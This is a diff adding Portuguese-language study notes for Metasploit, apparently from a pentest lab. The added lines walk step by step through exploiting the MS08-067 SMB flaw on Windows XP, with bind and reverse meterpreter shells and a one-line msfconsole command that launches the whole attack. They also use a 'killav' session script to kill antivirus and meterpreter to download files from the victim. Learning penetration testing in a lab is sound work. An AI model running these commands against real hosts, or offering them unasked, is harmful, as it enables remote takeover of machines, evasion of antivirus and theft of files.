@@ -1,3 +1,6 @@
+win xp 17
+win7 15
+meta 20
 # atualizar exploits
 msfupdate
 
@@ -20,4 +23,50 @@ search -h # para help
 search cve:2015 type:exploit app:client
 
 search Internet Explorer
+
+# exemplo de exploit para windows xp SMB ( compartilhamento )
+use exploit/windows/smb/ms08_067_netapi
+# mostrar opcoes
+show options
+# sistema a explorar
+set RHOST 192.168.1.112 #( vitima )
+show options # para ver a mudança
+
+# quando precisar de um local( reversa )
+# setg LHOST 192.168.1.107 # minha maq
+
+# pesquisar um payload
+search windows/shell
+
+# conexao direta
+set PAYLOAD windows/shell/bind_tcp
+
+show options
+
+# para saber se esqueceu de alguma configuracao
+show missing 
+exploit
+
+
+################
+CRTZ + Z = ENCESSAO SECAO # no metepreter pode usar #background
+sessions -l # mostrar sessoes
+sessions -i N # trocar N pelo numero da sessao
+sessions -u N # TENTAR ABRIR PELO METERPRETER ( INSTALAR )
+sessions -s killav -i N # tentanr matar antivurs, usando scripts
+search post/windows # como ver os scripts do windows por exemplo
+sessions -k N # elimina a sessao
+
+
+#######
+# usar em uma unica linha:
+msfconsole -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.15; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.1.17; run"
+
+##### NO METEPRETER
+? para pesqusia
+# voce pode usar comandos como:
+ls
+cd ..
+pwd
+download calc.exe # para download
 
